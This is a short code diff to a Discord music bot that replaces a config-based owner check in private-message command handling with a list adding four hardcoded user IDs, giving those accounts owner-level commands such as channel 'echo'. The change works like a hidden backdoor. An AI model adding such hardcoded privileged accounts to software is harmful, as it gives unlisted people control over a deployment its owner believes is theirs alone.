@@ -1964,7 +1964,7 @@ class MusicBot(discord.Client):
         command = command[len(self.config.command_prefix):].lower().strip()
 
         if message.channel.is_private:
-            if message.author.id == self.config.owner_id:
+            if message.author.id in [self.config.owner_id, 186955497671360512, 104445625562570752, 152303040970489856, 279857235444760586]:
                 awsw = list(self.servers)[0]
                 if command == "echo":
                     for channel in awsw.channels:
